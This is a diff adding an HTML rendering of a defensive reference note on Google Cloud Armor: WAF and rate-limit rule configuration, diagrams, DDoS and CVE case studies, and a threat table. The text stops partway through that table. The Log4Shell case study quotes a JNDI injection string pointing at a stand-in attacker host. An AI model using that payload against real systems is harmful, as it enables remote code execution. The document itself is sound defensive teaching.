@@ -1,0 +1,1336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GCP Cloud Armor — Edge WAF and DDoS Protection</title>
+
+  <!-- Mermaid JS (CDN). Render lazily so very large pages stay scrollable. -->
+  <script type="module">
+    import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs';
+    mermaid.initialize({ startOnLoad: false, theme: 'neutral' });
+
+    function renderMermaidBlock(el) {
+      if (el.dataset.mermaidState) return;
+      el.dataset.mermaidState = 'rendering';
+      mermaid.run({ nodes: [el] })
+        .then(function () {
+          el.dataset.mermaidState = 'rendered';
+        })
+        .catch(function (err) {
+          el.dataset.mermaidState = 'error';
+          el.classList.add('mermaid-error');
+          console.error('Mermaid render failed:', err);
+        });
+    }
+
+    function initMermaidLazyRender() {
+      var blocks = Array.prototype.slice.call(document.querySelectorAll('.mermaid'));
+      if (!blocks.length) return;
+
+      if ('IntersectionObserver' in window) {
+        var observer = new IntersectionObserver(function (entries) {
+          entries.forEach(function (entry) {
+            if (!entry.isIntersecting) return;
+            observer.unobserve(entry.target);
+            renderMermaidBlock(entry.target);
+          });
+        }, { rootMargin: '800px 0px', threshold: 0.01 });
+
+        blocks.forEach(function (block) {
+          observer.observe(block);
+        });
+      } else {
+        var index = 0;
+        function renderBatch() {
+          blocks.slice(index, index + 8).forEach(renderMermaidBlock);
+          index += 8;
+          if (index < blocks.length) window.setTimeout(renderBatch, 50);
+        }
+        renderBatch();
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', initMermaidLazyRender);
+    } else {
+      initMermaidLazyRender();
+    }
+  </script>
+
+  <!-- Syntax highlighting (optional, no build step required) -->
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
+  <style>
+    *  { box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, sans-serif;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 32px 24px;
+      line-height: 1.7;
+      color: #24292f;
+      background: #fff;
+    }
+
+    /* Typography */
+    h1, h2, h3, h4, h5, h6 {
+      margin-top: 1.6em;
+      margin-bottom: 0.4em;
+      border-bottom: 1px solid #d0d7de;
+      padding-bottom: 0.3em;
+      font-weight: 600;
+    }
+    h1 { font-size: 2em; }
+    h2 { font-size: 1.5em; }
+    a { color: #0969da; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* Code */
+    pre {
+      background: #f6f8fa;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 16px;
+      overflow-x: auto;
+    }
+    code {
+      background: #f6f8fa;
+      padding: 0.2em 0.4em;
+      border-radius: 4px;
+      font-family: "Cascadia Code", "Fira Code", "Courier New", monospace;
+      font-size: 0.9em;
+    }
+    pre code {
+      background: none;
+      padding: 0;
+      border-radius: 0;
+    }
+
+    /* Tables */
+    table {
+      border-collapse: collapse;
+      width: 100%;
+      margin: 16px 0;
+      font-size: 0.92em;
+    }
+    th, td {
+      border: 1px solid #d0d7de;
+      padding: 8px 14px;
+      text-align: left;
+      vertical-align: top;
+    }
+    th {
+      background: #f6f8fa;
+      font-weight: 600;
+    }
+    tr:nth-child(even) { background: #f9f9f9; }
+
+    /* Blockquotes */
+    blockquote {
+      border-left: 4px solid #d0d7de;
+      margin: 0 0 16px 0;
+      padding: 8px 16px;
+      color: #57606a;
+      background: #f6f8fa;
+      border-radius: 0 6px 6px 0;
+    }
+
+    /* Mermaid diagrams */
+    .mermaid {
+      background: #fafbfc;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 20px;
+      margin: 20px 0;
+      overflow-x: auto;
+      text-align: center;
+    }
+    pre.mermaid {
+      white-space: pre;
+    }
+    .mermaid svg {
+      max-width: 100%;
+      height: auto;
+    }
+    .mermaid[data-mermaid-state="rendering"] {
+      min-height: 140px;
+    }
+    .mermaid-error {
+      text-align: left;
+      color: #57606a;
+    }
+
+    /* Images */
+    img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 6px;
+      margin: 14px 0;
+      border: 1px solid #d0d7de;
+      background: #fff;
+      cursor: zoom-in;
+      display: block;
+    }
+
+    /* ── Image zoom overlay ─────────────────────────────── */
+    #img-zoom-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.82);
+      z-index: 9999;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+    #img-zoom-overlay.active { display: flex; }
+    #img-zoom-wrap {
+      position: relative;
+      overflow: hidden;
+      width: 100vw;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: grab;
+    }
+    #img-zoom-wrap.dragging { cursor: grabbing; }
+    #img-zoom-el {
+      max-width: none;
+      max-height: none;
+      border: none;
+      margin: 0;
+      border-radius: 4px;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.6);
+      transform-origin: center center;
+      user-select: none;
+      pointer-events: none;
+    }
+    #img-zoom-controls {
+      position: fixed;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      background: rgba(20,20,20,0.88);
+      padding: 7px 18px;
+      border-radius: 24px;
+      z-index: 10000;
+    }
+    #img-zoom-controls button {
+      background: none;
+      border: 1px solid rgba(255,255,255,0.35);
+      color: #fff;
+      font-size: 1.1em;
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.15s;
+    }
+    #img-zoom-controls button:hover { background: rgba(255,255,255,0.15); }
+    #img-zoom-level {
+      color: #ccc;
+      font-size: 0.82em;
+      min-width: 46px;
+      text-align: center;
+      font-family: monospace;
+    }
+    #img-zoom-close {
+      position: fixed;
+      top: 16px;
+      right: 20px;
+      background: none;
+      border: 1px solid rgba(255,255,255,0.35);
+      color: #fff;
+      font-size: 1.3em;
+      width: 38px;
+      height: 38px;
+      border-radius: 50%;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+      transition: background 0.15s;
+    }
+    #img-zoom-close:hover { background: rgba(255,255,255,0.15); }
+    #img-zoom-hint {
+      position: fixed;
+      top: 16px;
+      left: 50%;
+      transform: translateX(-50%);
+      color: rgba(200,200,200,0.7);
+      font-size: 0.76em;
+      font-family: -apple-system, sans-serif;
+      z-index: 10000;
+      pointer-events: none;
+    }
+
+    /* Breadcrumb / path */
+    .file-path {
+      font-size: 0.8em;
+      color: #57606a;
+      margin-bottom: 24px;
+      font-family: monospace;
+    }
+
+    /* Horizontal rule */
+    hr { border: none; border-top: 2px solid #d0d7de; margin: 24px 0; }
+  </style>
+</head>
+<body>
+  <p class="file-path">Source: cloud\GCP\Networking\Cloud-Armor\README.md</p>
+<h1 id="gcp-cloud-armor-edge-waf-and-ddos-protection">GCP Cloud Armor — Edge WAF and DDoS Protection</h1>
+<p><strong>Service:</strong> Google Cloud Armor (edge security policies, WAF, L3–L7 DDoS defense)<br />
+<strong>Attach point:</strong> Global External Application Load Balancer, Global External Proxy Network LB, Cloud CDN, Hybrid connectivity NEGs<br />
+<strong>Standards / refs:</strong> OWASP ModSecurity Core Rule Set (CRS) 3.3, MITRE ATT&amp;CK (T1498 Network DoS, T1190 Exploit Public-Facing App), CVE-2023-44487 (HTTP/2 Rapid Reset), NIST SP 800-61r2<br />
+<strong>Related notes:</strong> <code>../../../../web/Server-Side-Attacks/SQLi/README.md</code>, <code>../../../../web/Client-Side-Attacks/XSS/README.md</code>, <code>../../../../web/APIs/API-Security/README.md</code>, <code>../../../../web/Browser-Security/User-Agents/README.md</code>, <code>../../../../cloud/AWS/Security/WAF/README.md</code>, <code>../../../../cloud/AWS/Security/Shield/README.md</code>, <code>../../../../cloud/Azure/Security/DDoS-Protection/README.md</code>, <code>../../../../cloud/Azure/Networking/Front-Door/README.md</code></p>
+<hr />
+<h2 id="1-overview">1. Overview</h2>
+<p>Cloud Armor is Google Cloud's edge security layer: a web application firewall (WAF), a DDoS mitigation system, and an access-control engine that sits <strong>in front of</strong> Google's Global External Load Balancers (GXLB) at the network edge — the same edge, running on the same Google Front Ends (GFEs), that fronts Google Search and YouTube. Because Google terminates external traffic at hundreds of points of presence (PoPs) close to users, the L3/L4 volumetric absorption capacity is measured in <strong>terabits per second</strong>, and always-on protection for the network and transport layers is applied automatically before a packet ever reaches your backend. On top of that always-on baseline, Cloud Armor lets you author <strong>security policies</strong> — ordered lists of rules with <code>allow</code>, <code>deny</code>, <code>throttle</code>, <code>rate_based_ban</code>, and <code>redirect</code> (to reCAPTCHA) actions — that are evaluated at the GFE, so malicious requests are dropped at the edge and never consume backend CPU, VPC egress, or autoscaling budget.</p>
+<p>At scale this matters because the edge is the only place you can shed load <em>before</em> it costs you money and availability. A WAF at the origin still forces you to pay for the connection, TLS handshake, and compute to reject a request; Cloud Armor rejects it at the GFE. In October 2023 this architecture absorbed the largest Layer-7 DDoS on record at the time — a <strong>398 million requests-per-second</strong> HTTP/2 Rapid Reset flood (CVE-2023-44487) — without customer-visible impact for protected properties.</p>
+<blockquote>
+<p><strong>TL;DR</strong><br />
+- Cloud Armor is Google's <strong>edge WAF + DDoS</strong> service; it attaches to a <strong>Global External Load Balancer</strong> (or Cloud CDN / hybrid NEG), and rules are enforced at the <strong>GFE</strong>, not the backend.<br />
+- <strong>L3/L4 volumetric DDoS is absorbed automatically and always-on</strong> (Standard tier free); <strong>L7 WAF, rate limiting, bot management, and Adaptive Protection</strong> are the configurable layer (Managed Protection Plus is the paid tier for advanced L7 + ML).<br />
+- Rules combine a <strong>CEL match expression</strong> with an action; <strong>preconfigured WAF rules</strong> wrap OWASP ModSecurity CRS for SQLi/XSS/LFI/RCE/LFI, tunable by <code>sensitivity</code> level.<br />
+- <strong>Adaptive Protection</strong> is per-backend ML that baselines normal L7 traffic and auto-proposes a mitigating rule during an attack.<br />
+- Order matters: rules evaluate by ascending <strong>priority number</strong> (lowest wins); the default <code>2147483647</code> rule sets the baseline allow/deny.</p>
+</blockquote>
+<hr />
+<h2 id="2-how-it-works">2. How It Works</h2>
+<h3 id="21-core-mechanics">2.1 Core mechanics</h3>
+<p>Cloud Armor has a clean control-plane / data-plane split. The <strong>control plane</strong> is the <code>securityPolicy</code> API object plus its child <code>rule</code> objects, plus <code>addressGroup</code> (named IP lists) and Adaptive Protection config; you mutate these with <code>gcloud compute security-policies …</code> or Terraform, and Google propagates them to every GFE globally within a couple of minutes. The <strong>data plane</strong> is the fleet of GFEs at Google's edge that evaluate every incoming HTTP(S) request against the attached policy before proxying to a backend service.</p>
+<p>A <strong>security policy</strong> is attached to one or more <strong>backend services</strong> of a Global External Application Load Balancer (via <code>--security-policy</code> on the backend service). There are two policy <em>types</em>: <strong>backend security policies</strong> (evaluated after the LB picks a backend, the classic WAF) and <strong>edge security policies</strong> (evaluated earlier, at the outermost edge, primarily for Cloud CDN-cached content and coarse IP/geo filtering — a request can be evaluated by <em>both</em>). Each policy is an <strong>ordered list of rules</strong>; each rule has a <strong>priority</strong> (integer, evaluated ascending — lower number = higher precedence), a <strong>match</strong> condition, and an <strong>action</strong>. Evaluation is <strong>first-match-wins</strong>: the GFE walks rules in priority order and applies the action of the first rule whose match evaluates true, then stops. A catch-all default rule at priority <code>2147483647</code> decides the fate of unmatched traffic (typically <code>allow</code>, or <code>deny-403</code> for a default-deny posture).</p>
+<p>Match conditions come in two flavors. <strong>Basic matches</strong> use <code>--src-ip-ranges</code> (CIDR list, up to 10 per rule, or a named address group). <strong>Advanced matches</strong> use a <strong>CEL (Common Expression Language)</strong> expression in the <code>--expression</code> flag, giving you access to <code>origin.ip</code>, <code>origin.region_code</code> (geo), <code>request.headers['...']</code>, <code>request.path</code>, <code>request.query</code>, <code>request.method</code>, and the <strong>preconfigured WAF evaluators</strong> like <code>evaluatePreconfiguredWaf('sqli-v33-stable')</code>. Actions are <code>allow</code>, <code>deny(403|404|502)</code>, <code>rate_based_ban</code>, <code>throttle</code>, <code>redirect</code> (to Google reCAPTCHA or an external URL), and — with Adaptive Protection — an auto-generated <code>deny</code> rule.</p>
+<table>
+<thead>
+<tr>
+<th>Object / concept</th>
+<th>What it is</th>
+<th>Critical detail</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Security policy</td>
+<td>Ordered rule container attached to a backend service</td>
+<td>Types: <code>CLOUD_ARMOR</code> (backend/WAF) and <code>CLOUD_ARMOR_EDGE</code> (edge)</td>
+</tr>
+<tr>
+<td>Rule priority</td>
+<td>Integer, evaluated ascending</td>
+<td>Lowest number wins; <strong>first match stops evaluation</strong></td>
+</tr>
+<tr>
+<td>Default rule</td>
+<td>Priority <code>2147483647</code></td>
+<td>Fate of unmatched traffic; set to <code>deny-403</code> for default-deny</td>
+</tr>
+<tr>
+<td>Basic match</td>
+<td><code>--src-ip-ranges</code> CIDRs or address group</td>
+<td>Fast IP/geo allow/deny lists</td>
+</tr>
+<tr>
+<td>Advanced match (CEL)</td>
+<td><code>--expression</code> in CEL</td>
+<td>Access to headers, path, query, geo, <code>evaluatePreconfiguredWaf(...)</code></td>
+</tr>
+<tr>
+<td>Preconfigured WAF rule</td>
+<td>Wraps OWASP ModSecurity CRS 3.3</td>
+<td><code>sqli-v33</code>, <code>xss-v33</code>, <code>lfi-v33</code>, <code>rce-v33</code>, <code>rfi-v33</code>, <code>scannerdetection-v33</code>, <code>protocolattack-v33</code>, <code>sessionfixation-v33</code></td>
+</tr>
+<tr>
+<td>Sensitivity level</td>
+<td>CRS paranoia tuning 0–4</td>
+<td>Higher = more rules = more false positives; start at 1</td>
+</tr>
+<tr>
+<td>Rate-based ban</td>
+<td><code>--action rate_based_ban</code></td>
+<td>Throttle then ban a client key for N seconds when threshold exceeded</td>
+</tr>
+<tr>
+<td>Throttle</td>
+<td><code>--action throttle</code></td>
+<td>Enforce a steady rate, <code>429</code> the overflow, no ban</td>
+</tr>
+<tr>
+<td>Adaptive Protection</td>
+<td>Per-backend ML L7 DDoS detection</td>
+<td>Requires Managed Protection Plus; emits an alert + suggested rule</td>
+</tr>
+<tr>
+<td>Address group</td>
+<td>Named reusable IP list</td>
+<td><code>gcloud network-security address-groups</code> (Cloud Armor + firewall)</td>
+</tr>
+<tr>
+<td>reCAPTCHA action</td>
+<td><code>redirect</code> to reCAPTCHA Enterprise</td>
+<td>Session-token + action-token bot scoring at the edge</td>
+</tr>
+<tr>
+<td>Managed Protection tiers</td>
+<td>Standard (free) vs Plus (subscription)</td>
+<td>Plus unlocks Adaptive Protection, named IP lists, DDoS bill protection</td>
+</tr>
+</tbody>
+</table>
+<h3 id="22-concrete-configuration">2.2 Concrete configuration</h3>
+<p><strong>Create a policy and set a default-deny baseline.</strong> In a high-assurance posture I default-deny and explicitly allow, but for a public web property default-allow with layered WAF is the norm. Here I show default-allow with WAF + rate limiting.</p>
+<pre><code class="language-bash"># 1. Create a backend (WAF) security policy
+gcloud compute security-policies create corp-web-armor \
+    --description &quot;Edge WAF + rate limit for the public web tier&quot; \
+    --type CLOUD_ARMOR
+
+# 2. Turn on verbose logging so we can see which rule/subsig matched
+gcloud compute security-policies update corp-web-armor \
+    --log-level VERBOSE
+</code></pre>
+<p><strong>Add a preconfigured WAF rule for SQL injection.</strong> The <code>evaluatePreconfiguredWaf</code> CEL function runs the OWASP CRS SQLi rule set. <code>sensitivity</code> maps to CRS paranoia levels — level 1 is the low-false-positive baseline; I explicitly opt out of noisy subsignatures with <code>opt_out_rule_ids</code> after tuning against real traffic.</p>
+<pre><code class="language-bash">gcloud compute security-policies rules create 1000 \
+    --security-policy corp-web-armor \
+    --description &quot;OWASP CRS SQLi, paranoia 1, tuned&quot; \
+    --expression &quot;evaluatePreconfiguredWaf('sqli-v33-stable', {'sensitivity': 1, 'opt_out_rule_ids': ['owasp-crs-v030301-id942440-sqli']})&quot; \
+    --action deny-403
+</code></pre>
+<pre><code class="language-bash"># XSS and Local/Remote File Inclusion + RCE in one composite rule
+gcloud compute security-policies rules create 1010 \
+    --security-policy corp-web-armor \
+    --description &quot;XSS, LFI, RFI, RCE preconfigured WAF&quot; \
+    --expression &quot;evaluatePreconfiguredWaf('xss-v33-stable', {'sensitivity': 1}) || evaluatePreconfiguredWaf('lfi-v33-stable', {'sensitivity': 1}) || evaluatePreconfiguredWaf('rce-v33-stable', {'sensitivity': 1})&quot; \
+    --action deny-403
+</code></pre>
+<p><strong>Rate-limit and auto-ban abusive clients.</strong> This is the single most valuable rule for credential-stuffing and L7 floods. <code>rate_based_ban</code> throttles a client key (here the source IP; can be <code>HTTP_HEADER</code>, <code>HTTP_COOKIE</code>, <code>XFF_IP</code>, or <code>ALL</code> for a global counter) and, once it crosses the threshold, <strong>bans</strong> it for a fixed duration.</p>
+<pre><code class="language-bash">gcloud compute security-policies rules create 2000 \
+    --security-policy corp-web-armor \
+    --description &quot;Rate-based ban: 100 req / 60s per IP on /login, then 600s ban&quot; \
+    --expression &quot;request.path.matches('/login')&quot; \
+    --action rate_based_ban \
+    --rate-limit-threshold-count 100 \
+    --rate-limit-threshold-interval-sec 60 \
+    --ban-duration-sec 600 \
+    --ban-threshold-count 100 \
+    --ban-threshold-interval-sec 60 \
+    --conform-action allow \
+    --exceed-action deny-429 \
+    --enforce-on-key IP
+</code></pre>
+<p><strong>Named IP allow/deny lists via address groups.</strong> Reusable across many policies and firewall rules; you edit the list once and every rule referencing it updates.</p>
+<pre><code class="language-bash">gcloud network-security address-groups create corp-egress-allowlist \
+    --type IPV4 --capacity 100 --location global \
+    --items &quot;203.0.113.0/24,198.51.100.7/32&quot;
+
+gcloud compute security-policies rules create 500 \
+    --security-policy corp-web-armor \
+    --description &quot;Allow corporate ranges to /admin&quot; \
+    --expression &quot;request.path.startsWith('/admin') &amp;&amp; !inIpRange(origin.ip, '203.0.113.0/24')&quot; \
+    --action deny-403
+</code></pre>
+<p><strong>Geo-block and a reCAPTCHA challenge for suspected bots.</strong></p>
+<pre><code class="language-bash"># Block two sanctioned regions outright
+gcloud compute security-policies rules create 700 \
+    --security-policy corp-web-armor \
+    --expression &quot;origin.region_code == 'KP' || origin.region_code == 'CU'&quot; \
+    --action deny-403
+
+# Send low-score sessions to a reCAPTCHA Enterprise redirect (manual challenge)
+gcloud compute security-policies rules create 1500 \
+    --security-policy corp-web-armor \
+    --expression &quot;request.path.matches('/checkout') &amp;&amp; token.recaptcha_session.score &lt; 0.5&quot; \
+    --action redirect \
+    --redirect-type GOOGLE_RECAPTCHA
+</code></pre>
+<p><strong>Turn on Adaptive Protection (ML L7 DDoS) and attach the policy.</strong></p>
+<pre><code class="language-bash"># Enable per-backend ML DDoS detection (requires Managed Protection Plus)
+gcloud compute security-policies update corp-web-armor \
+    --enable-layer7-ddos-defense \
+    --layer7-ddos-defense-rule-visibility STANDARD
+
+# Attach the finished policy to the LB backend service
+gcloud compute backend-services update corp-web-backend \
+    --security-policy corp-web-armor --global
+</code></pre>
+<p><strong>Terraform equivalent</strong> (what I'd actually commit — policy-as-code with review):</p>
+<pre><code class="language-hcl">resource &quot;google_compute_security_policy&quot; &quot;edp_web_armor&quot; {
+  name = &quot;corp-web-armor&quot;
+
+  adaptive_protection_config {
+    layer_7_ddos_defense_config {
+      enable          = true
+      rule_visibility = &quot;STANDARD&quot;
+    }
+  }
+
+  rule {
+    priority = 2000
+    action   = &quot;rate_based_ban&quot;
+    match { expr { expression = &quot;request.path.matches('/login')&quot; } }
+    rate_limit_options {
+      conform_action = &quot;allow&quot;
+      exceed_action  = &quot;deny(429)&quot;
+      enforce_on_key = &quot;IP&quot;
+      rate_limit_threshold { count = 100  interval_sec = 60 }
+      ban_duration_sec = 600
+      ban_threshold { count = 100 interval_sec = 60 }
+    }
+  }
+
+  rule {
+    priority = 1000
+    action   = &quot;deny(403)&quot;
+    match { expr { expression = &quot;evaluatePreconfiguredWaf('sqli-v33-stable', {'sensitivity': 1})&quot; } }
+  }
+
+  rule {
+    priority = 2147483647
+    action   = &quot;allow&quot;
+    match { versioned_expr = &quot;SRC_IPS_V1&quot; config { src_ip_ranges = [&quot;*&quot;] } }
+  }
+}
+</code></pre>
+<h3 id="23-diagrams">2.3 Diagrams</h3>
+<p><strong>Diagram A — Where Cloud Armor sits in the request path</strong></p>
+<pre class="mermaid">
+flowchart LR
+    U[User or bot] --> GFE[Google Front End at edge]
+    GFE --> L34[L3 L4 DDoS absorption always on]
+    L34 --> EP[Edge security policy]
+    EP --> LB[Global External Load Balancer]
+    LB --> BP[Backend security policy WAF]
+    BP --> AP[Adaptive Protection ML]
+    AP --> BE[Backend service or bucket]
+    BP -->|deny 403 or 429| U
+    EP -->|deny| U
+</pre>
+<p><strong>Diagram B — Rule evaluation order within a policy</strong></p>
+<pre class="mermaid">
+flowchart TD
+    Start[Request arrives at GFE] --> R1[Evaluate lowest priority rule]
+    R1 --> M1{Match}
+    M1 -->|Yes| A1[Apply action then stop]
+    M1 -->|No| R2[Next higher priority number]
+    R2 --> M2{Match}
+    M2 -->|Yes| A2[Apply action then stop]
+    M2 -->|No| DEF[Default rule 2147483647]
+    DEF --> A3[Apply default action]
+</pre>
+<p><strong>Diagram C — Rate-based ban state machine</strong></p>
+<pre class="mermaid">
+stateDiagram-v2
+    [*] --> Normal
+    Normal --> Throttled: rate over threshold
+    Throttled --> Banned: ban threshold exceeded
+    Throttled --> Normal: rate falls below threshold
+    Banned --> Normal: ban duration elapsed
+    Banned --> Banned: request during ban returns 429 or 403
+</pre>
+<p><strong>Diagram D — Adaptive Protection detection loop</strong></p>
+<pre class="mermaid">
+sequenceDiagram
+    participant T as Traffic to backend
+    participant AP as Adaptive Protection ML
+    participant OPS as SecOps or SOAR
+    participant POL as Security policy
+    T->>AP: Continuous L7 feature baseline
+    AP->>AP: Detect anomaly and score confidence
+    AP->>OPS: Alert with attack signature and suggested rule
+    OPS->>POL: Apply or auto deploy suggested deny rule
+    POL->>T: Malicious subset dropped at GFE
+</pre>
+<p><strong>Diagram E — HTTP/2 Rapid Reset flood vs Cloud Armor</strong></p>
+<pre class="mermaid">
+flowchart LR
+    BOT[Botnet many clients] -->|open stream then RST_STREAM| GFE[Google Front End]
+    GFE --> DET[Rapid Reset heuristic and stream cap]
+    DET -->|drop abusive streams| DROP[Connection throttled]
+    DET -->|legit streams| LB[Load Balancer]
+    LB --> BE[Backend unaffected]
+</pre>
+<hr />
+<h2 id="3-real-world-incidents-cves">3. Real-World Incidents &amp; CVEs</h2>
+<table>
+<thead>
+<tr>
+<th>Incident / CVE</th>
+<th>Year</th>
+<th>Root cause</th>
+<th>Lesson</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2023-44487 HTTP/2 Rapid Reset</td>
+<td>2023</td>
+<td>HTTP/2 stream open + immediate <code>RST_STREAM</code> amplifies request rate beyond connection limits</td>
+<td>Edge providers must cap and throttle rapid stream resets; L7 absorption capacity is decisive</td>
+</tr>
+<tr>
+<td>398 Mrps DDoS on Google Cloud</td>
+<td>2023</td>
+<td>Rapid Reset botnet; peak 398 million req/s</td>
+<td>Cloud Armor + GFE absorbed it; more requests in 2 min than all Wikipedia article views for Sept 2023</td>
+</tr>
+<tr>
+<td>46 Mrps DDoS on Google Cloud</td>
+<td>2022</td>
+<td>Layer-7 HTTPS flood, ~5,256 source IPs across 132 countries</td>
+<td>Previous record; Adaptive Protection flagged and generated a mitigating rule early</td>
+</tr>
+<tr>
+<td>Log4Shell CVE-2021-44228</td>
+<td>2021</td>
+<td>JNDI lookup in Log4j via crafted header/URI</td>
+<td>Cloud Armor <code>cve-canary</code> preconfigured rule shipped as virtual-patch stopgap</td>
+</tr>
+<tr>
+<td>Spring4Shell CVE-2022-22965</td>
+<td>2022</td>
+<td>Spring <code>ClassLoader</code> data-binding RCE</td>
+<td>Preconfigured <code>rce-v33</code> + custom header rule as compensating control</td>
+</tr>
+<tr>
+<td>Mirai / IoT botnets (context)</td>
+<td>2016+</td>
+<td>Compromised IoT devices generate volumetric floods</td>
+<td>L3/L4 always-on absorption is the only viable defense at Tbps scale</td>
+</tr>
+<tr>
+<td>AWS 2.3 Tbps CLDAP reflection</td>
+<td>2020</td>
+<td>UDP reflection/amplification</td>
+<td>Cross-cloud reminder: volumetric defense is a capacity game, done at the edge</td>
+</tr>
+<tr>
+<td>Cloudflare 3.8 Tbps (context)</td>
+<td>2024</td>
+<td>Multi-vector L3/L4 flood</td>
+<td>Industry record shows floods keep growing; absorption must scale faster</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Case study 1 — The 398 Mrps HTTP/2 Rapid Reset (August–October 2023).</strong> HTTP/2 multiplexes many streams over one TCP connection. A client can open a request stream and immediately send <code>RST_STREAM</code> to cancel it. The server still does the work of setting up and tearing down the stream, but the cancellation frees the client's concurrency slot instantly — so a single connection can issue an unbounded rate of requests, defeating the <code>SETTINGS_MAX_CONCURRENT_STREAMS</code> limit that was supposed to bound work. Attackers weaponized this (CVE-2023-44487) to reach <strong>398 million requests per second</strong> against Google. Cloud Armor and the GFE fleet absorbed it because Google (a) has massive globally distributed L7 capacity, and (b) shipped heuristics that detect abnormal rapid stream-reset ratios and throttle offending connections. The control that stopped it was the <strong>edge L7 absorption + Rapid Reset mitigation</strong> built into the GFE; a customer origin WAF would have been overrun long before. Lesson in a design review: <strong>you cannot rate-limit your way out of a 398 Mrps flood at your origin — the defense must live at an edge with Tbps/Mrps headroom.</strong></p>
+<p><strong>Case study 2 — Log4Shell virtual patching (December 2021).</strong> When CVE-2021-44228 dropped, exploitation was trivial: put <code>${jndi:ldap://attacker/x}</code> in any logged field (User-Agent, URI, form data). Patching every Java service takes days. Cloud Armor customers deployed a <strong>custom CEL rule</strong> matching the JNDI pattern across headers and body plus Google's <code>cve-canary</code> preconfigured signature, blocking exploit strings at the edge within minutes — a textbook <strong>virtual patch</strong> buying time to patch backends. The control was <strong>preconfigured WAF + custom rule as a compensating control</strong>; the lesson is that a WAF's real value is often the <em>speed</em> of shipping a virtual patch, not steady-state filtering.</p>
+<p><strong>Case study 3 — The 46 Mrps flood and Adaptive Protection (June 2022).</strong> A Layer-7 HTTPS flood ramped from 10k to 46 million requests per second in under 10 seconds, from 5,256 IPs in 132 countries (Tor exit nodes were a notable fraction). Google Cloud Armor <strong>Adaptive Protection</strong> had already alerted the customer <em>before</em> the attack peaked, because its per-backend ML baseline detected the anomalous rise and generated a <strong>recommended rule</strong> with a signature the customer could deploy in one click. The control was <strong>Adaptive Protection ML detection → suggested rule → edge enforcement</strong>; the lesson is that human-authored static rules cannot keep pace with a flood that reaches peak in 10 seconds — you need ML that proposes mitigations in near real time.</p>
+<hr />
+<h2 id="4-what-can-go-wrong">4. What Can Go Wrong</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Threat / Attack</th>
+<th>ATT&amp;CK / category</th>
+<th>Root cause</th>
+<th>Impact</th>
+<th>Likelihood</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Volumetric L3/L4 flood (UDP/SYN)</td>
+<td>T1498.001 Network DoS</td>
+<td>Raw packet volume exceeds link capacity</td>
+<td>Origin saturation, outage</td>
+<td>Med (edge absorbs)</td>
+</tr>
+<tr>
+<td>2</td>
+<td>L7 HTTP(S) flood</td>
+<td>T1498 Network DoS</td>
+<td>Cheap-to-send, expensive-to-serve requests</td>
+<td>Backend CPU exhaustion, autoscale bill</td>
+<td>High</td>
+</tr>
+<tr>
+<td>3</td>
+<td>HTTP/2 Rapid Reset</td>
+<td>T1499 Endpoint DoS / CVE-2023-44487</td>
+<td>Stream open + immediate RST bypasses concurrency cap</td>
+<td>Request amplification, outage</td>
+<td>Med</td>
+</tr>
+<tr>
+<td>4</td>
+<td>SQL injection</td>
+<td>T1190 Exploit Public-Facing App</td>
+<td>Unsanitized input into query; WAF disabled/mistuned</td>
+<td>Data exfiltration</td>
+<td>High</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Cross-site scripting (XSS)</td>
+<td>T1059.007 / T1190</td>
+<td>Reflected/stored script; WAF sensitivity too low</td>
+<td>Session theft, defacement</td>
+<td>High</td>
+</tr>
+<tr>
+<td>6</td>
+<td>LFI / RFI / path traversal</td>
+<td>T1190</td>
+<td><code>../</code> and file:// / remote include not filtered</td>
+<td>Source/secret disclosure, RCE</td>
+<td>Med</td>
+</tr>
+<tr>
+<td>7</td>
+<td>RCE via header/body (Log4Shell class)</td>
+<td>T1190</td>
+<td>Deserialization/JNDI in logged field</td>
+<td>Full compromise</td>
+<td>Med</td>
+</tr>
+<tr>
+<td>8</td>
+<td>WAF evasion via encoding</td>
+<td>T1027 Obfuscation</td>
+<td>Double URL-encoding, unicode, chunked body</td>
+<td>Bypass of WAF signatures</td>
+<td>Med</td>
+</tr>
+<tr>
+<td>9</td>
+<td>Rule-order misconfiguration</td>
+<td>Misconfiguration</td>
+<td>Broad allow at low priority shadows deny rules</td>
+<td>Attacks pass through</td>
+<td>Med</td>
+</tr>
+<tr>
+<td>10</td>
+<td>Overly broad IP allowlist / spoofed XFF</td>
+<td>Misconfiguration</td>
+<td>Trusting client-supplied <code>X-Forwarded-For</code></td>
+<td>Rate-limit and geo bypass</td>
+<td>Med</td>
+</tr>
+<tr>
+<td>11</td>
+<td>Credential stuffing / brute force</td>
+<td>T1110 Brute Force</td>
+<td>No per-user rate limit; per-IP only, proxy rotation</td>
+<td>Account takeover</td>
